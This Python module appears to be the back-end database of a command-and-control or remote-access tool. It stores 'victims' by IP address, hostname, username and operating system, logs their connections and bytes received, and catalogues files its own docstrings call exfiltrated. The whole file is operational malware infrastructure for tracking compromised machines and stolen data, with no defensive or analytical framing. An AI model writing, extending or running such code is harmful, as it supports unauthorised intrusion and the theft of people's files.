import os
import sqlite3
from pathlib import Path
from datetime import datetime

class VictimsDatabase:
    def __init__(self, db_path="data/victims.db"):
        self.db_path = db_path
        Path("data").mkdir(exist_ok=True)
        self.init_db()
    
    def _connect(self):
        conn = sqlite3.connect(self.db_path, timeout=10)
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA busy_timeout=5000")
        return conn
    
    def init_db(self):
        """Inicializa la base de datos SQLite con todas las tablas"""
        conn = self._connect()
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT UNIQUE NOT NULL,
                hostname TEXT NOT NULL,
                username TEXT NOT NULL,
                os_info TEXT NOT NULL,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT 1,
                connection_count INTEGER DEFAULT 1,
                mode TEXT DEFAULT 'unknown',
                total_bytes_received INTEGER DEFAULT 0
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS connection_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id INTEGER NOT NULL,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                mode TEXT NOT NULL,
                status TEXT NOT NULL,
                data_received INTEGER DEFAULT 0,
                FOREIGN KEY (victim_id) REFERENCES victims(id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS files_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id INTEGER NOT NULL,
                filename TEXT NOT NULL,
                filepath TEXT NOT NULL,
                file_size INTEGER NOT NULL,
                local_path TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (victim_id) REFERENCES victims(id)
            )
        ''')
        
        # Migración: agregar columnas si no existen
        try:
            cursor.execute("ALTER TABLE victims ADD COLUMN total_bytes_received INTEGER DEFAULT 0")
        except sqlite3.OperationalError:
            pass  # Ya existe
        
        conn.commit()
        conn.close()
    
    def add_victim(self, ip_address, hostname, username, os_info, mode="unknown"):
        """Agrega o actualiza una víctima en la base de datos"""
        try:
            conn = self._connect()
            cursor = conn.cursor()
            
            cursor.execute('SELECT id FROM victims WHERE ip_address = ?', (ip_address,))
            existing = cursor.fetchone()
            
            if existing:
                victim_id = existing[0]
                cursor.execute('''
                    UPDATE victims 
                    SET last_seen = CURRENT_TIMESTAMP, 
                        is_active = 1, 
                        connection_count = connection_count + 1,
                        hostname = CASE WHEN ? != 'Unknown' THEN ? ELSE hostname END,
                        username = CASE WHEN ? != 'Unknown' THEN ? ELSE username END,
                        os_info = CASE WHEN ? != 'Unknown' THEN ? ELSE os_info END,
                        mode = ?
                    WHERE id = ?
                ''', (hostname, hostname, username, username, os_info, os_info, mode, victim_id))
                status = "RECONECTADO"
            else:
                cursor.execute('''
                    INSERT INTO victims (ip_address, hostname, username, os_info, mode)
                    VALUES (?, ?, ?, ?, ?)
                ''', (ip_address, hostname, username, os_info, mode))
                victim_id = cursor.lastrowid
                status = "NUEVO"
            
            cursor.execute('''
                INSERT INTO connection_log (victim_id, mode, status)
                VALUES (?, ?, ?)
            ''', (victim_id, mode, "CONECTADO"))
            
            conn.commit()
            conn.close()
            
            return victim_id, status
        except Exception as e:
            print(f"[-] Error adding victim: {e}")
            return None, "ERROR"
    
    def add_file_log(self, victim_id, filename, filepath, file_size, local_path=None):
        """Registra un archivo exfiltrado"""
        try:
            conn = self._connect()
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO files_log (victim_id, filename, filepath, file_size, local_path)
                VALUES (?, ?, ?, ?, ?)
            ''', (victim_id, filename, filepath, file_size, local_path))
            
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            print(f"[-] Error logging file: {e}")
            return False
    
    def get_victim_files(self, victim_id):
        """Obtiene archivos exfiltrados de una víctima"""
        try:
            conn = self._connect()
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT id, filename, filepath, file_size, local_path, timestamp
                FROM files_log
                WHERE victim_id = ?
                ORDER BY timestamp DESC
            ''', (victim_id,))
            
            files = []
            for row in cursor.fetchall():
                files.append({
                    'id': row[0],
                    'filename': row[1],
                    'filepath': row[2],
                    'file_size': row[3],
                    'local_path': row[4],
                    'timestamp': row[5],
                })
            
            conn.close()
            return files
        except Exception as e:
            print(f"[-] Error getting victim files: {e}")
            return []
    
    def get_victim_files_count(self, victim_id):
        """Obtiene cantidad de archivos de una víctima"""
        try:
            conn = self._connect()
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*) FROM files_log WHERE victim_id = ?', (victim_id,))
            count = cursor.fetchone()[0]
            conn.close()
            return count
        except:
            return 0
    
    def get_victim_files_size(self, victim_id):
        """Obtiene tamaño total de archivos de una víctima"""
        try:
            conn = self._connect()
            cursor = conn.cursor()
            cursor.execute('SELECT COALESCE(SUM(file_size), 0) FROM files_log WHERE victim_id = ?', (victim_id,))
            size = cursor.fetchone()[0]
            conn.close()
            return size
        except:
            return 0
    
    def get_all_victims(self):
        """Obtiene todas las víctimas"""
        try:
            conn = self._connect()
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT id, ip_address, hostname, username, os_info, 
                       first_seen, last_seen, is_active, connection_count, mode,
                       total_bytes_received
                FROM victims
                ORDER BY last_seen DESC
            ''')
            
            victims = []
            for row in cursor.fetchall():
                victims.append({
                    'id': row[0],
                    'ip': row[1],
                    'hostname': row[2],
                    'username': row[3],
                    'os': row[4],
                    'first_seen': row[5],
                    'last_seen': row[6],
                    'active': row[7],
                    'connections': row[8],
                    'mode': row[9],
                    'total_bytes': row[10] or 0,
                })
            
            conn.close()
            return victims
        except Exception as e:
            print(f"[-] Error getting victims: {e}")
            return []
    
    def get_victim(self, victim_id):
        """Obtiene información de una víctima específica"""
        try:
            conn = self._connect()
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT id, ip_address, hostname, username, os_info, 
                       first_seen, last_seen, is_active, connection_count, mode,
                       total_bytes_received
                FROM victims WHERE id = ?
            ''', (victim_id,))
            
            row = cursor.fetchone()
            conn.close()
            
            if row:
                return {
                    'id': row[0],
                    'ip': row[1],
                    'hostname': row[2],
                    'username': row[3],
                    'os': row[4],
                    'first_seen': row[5],
                    'last_seen': row[6],
                    'active': row[7],
                    'connections': row[8],
                    'mode': row[9],
                    'total_bytes': row[10] or 0,
                }
            return None
        except Exception as e:
            print(f"[-] Error getting victim: {e}")
            return None
    
    def set_victim_inactive(self, victim_id):
        """Marca una víctima como inactiva"""
        try:
            conn = self._connect()
            cursor = conn.cursor()
            
            cursor.execute('UPDATE victims SET is_active = 0 WHERE id = ?', (victim_id,))
            cursor.execute('INSERT INTO connection_log (victim_id, mode, status) VALUES (?, ?, ?)',
                         (victim_id, 'unknown', 'DESCONECTADO'))
            
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[-] Error setting victim inactive: {e}")
    
    def get_active_victims(self):
        """Obtiene solo víctimas activas"""
        try:
            conn = self._connect()
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT id, ip_address, hostname, username, mode
                FROM victims
                WHERE is_active = 1
                ORDER BY last_seen DESC
            ''')
            
            victims = []
            for row in cursor.fetchall():
                victims.append({
                    'id': row[0],
                    'ip': row[1],
                    'hostname': row[2],
                    'username': row[3],
                    'mode': row[4]
                })
            
            conn.close()
            return victims
        except Exception as e:
            print(f"[-] Error getting active victims: {e}")
            return []
    
    def get_victim_count(self):
        """Obtiene el total de víctimas"""
        try:
            conn = self._connect()
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*) FROM victims')
            count = cursor.fetchone()[0]
            conn.close()
            return count
        except:
            return 0
    
    def get_active_count(self):
        """Obtiene el total de víctimas activas"""
        try:
            conn = self._connect()
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*) FROM victims WHERE is_active = 1')
            count = cursor.fetchone()[0]
            conn.close()
            return count
        except:
            return 0
    
    def update_victim_activity(self, victim_id, bytes_received=0):
        """Actualiza la actividad de una víctima con datos recibidos"""
        try:
            conn = self._connect()
            cursor = conn.cursor()
            
            cursor.execute('''
                UPDATE victims 
                SET last_seen = CURRENT_TIMESTAMP,
                    total_bytes_received = total_bytes_received + ?
                WHERE id = ?
            ''', (bytes_received, victim_id))
            
            cursor.execute('''
                INSERT INTO connection_log (victim_id, mode, status, data_received)
                VALUES (?, ?, ?, ?)
            ''', (victim_id, 'unknown', 'DATOS_RECIBIDOS', bytes_received))
            
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"[-] Error updating victim activity: {e}")
    
    def get_total_files_count(self):
        """Total de archivos exfiltrados"""
        try:
            conn = self._connect()
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*) FROM files_log')
            count = cursor.fetchone()[0]
            conn.close()
            return count
        except:
            return 0
    
    def get_total_data_received(self):
        """Total de bytes recibidos de todas las víctimas"""
        try:
            conn = self._connect()
            cursor = conn.cursor()
            cursor.execute('SELECT COALESCE(SUM(total_bytes_received), 0) FROM victims')
            total = cursor.fetchone()[0]
            conn.close()
            return total
        except:
            return 0
